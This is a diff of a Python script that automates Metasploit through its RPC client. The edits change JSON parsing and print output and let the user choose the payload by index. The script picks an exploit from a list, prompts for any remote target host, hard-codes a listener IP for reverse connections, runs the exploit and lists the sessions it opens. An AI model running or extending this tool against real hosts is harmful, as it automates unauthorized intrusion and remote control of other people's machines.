@@ -63,7 +63,7 @@ time.sleep(3)
 #     print("[i] Launching scan over @" + IP + " cmd :" + "CMD")
 
 with open(EXPLOIT_LIST, "r+") as f:
-    result = json.loads("[" + f.read() + "]")
+    result = json.loads(f.read())
 
 titles = []
 for k, pwn in enumerate(result):
@@ -71,7 +71,7 @@ for k, pwn in enumerate(result):
 
 print("[~] Possible exploits :")
 if titles:
-    pprint.pprint(titles, underscore_numbers=True)
+    pprint.pprint(titles)
     print("\n")
 
 choice = input("[~] Please select an exploit: ")
@@ -101,8 +101,9 @@ pprint.pprint(modulus)
 
 
 exploit = client.modules.use(modulus[0][0], modulus[0][1])
-print("[V] Selected payloads")
+print("[V] Selected payloads: ", exploit.info)
 
+print("Exploit options :")
 print(exploit.options)
 print("\n")
 
@@ -110,7 +111,8 @@ plds = exploit.targetpayloads()
 print("[~] Available payloads :")
 pprint.pprint(plds)
 
-payload = client.modules.use("payload", plds[7])
+pay_idx = int(input("Which payload do you want to use ? : "))
+payload = client.modules.use("payload", plds[pay_idx])
 print("[V] Payload selected !")
 
 print(payload.missing_required)
@@ -118,10 +120,10 @@ print("\n")
 
 
 exploit["RHOSTS"] = input("Remote HOST : ")
-payload["LHOST"] = "192.168.1.86"
+payload["LHOST"] = "192.168.8.116"
 
 print(exploit.execute(payload=payload))
-time.sleep(10)
+time.sleep(15)
 
 print(client.sessions.list)
 print("\n")
